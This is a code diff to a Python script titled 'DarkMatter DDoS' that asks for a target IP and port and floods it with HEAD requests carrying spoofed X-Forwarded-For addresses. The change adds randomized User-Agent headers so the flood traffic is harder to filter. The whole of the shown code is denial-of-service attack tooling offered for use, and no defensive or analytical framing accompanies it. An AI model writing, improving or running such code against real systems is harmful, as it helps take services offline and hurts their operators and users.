@@ -2,12 +2,16 @@ import socket
 import os, sys
 import time
 import multiprocessing, random
+from fake_useragent import UserAgent
 
 print("Welcome To DarkMatter DDoS")
 ip = input("IP/Domain: ")
 port = int(input("Port: "))
 
 url = "http://" + str(ip)
+def Agent():
+	user_agent = UserAgent().random
+	return user_agent
 
 def randomip():
   randip = []
@@ -32,6 +36,7 @@ time.sleep(1)
 
 def attack():
   connection = "Connection: null\r\n"
+  useragent = "User-Agent: " + Agent() + "\r\n"
   referer = "Referer: null\r\n"
   forward = "X-Forwarded-For: " + randomip() + "\r\n"
   get_host = "HEAD " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
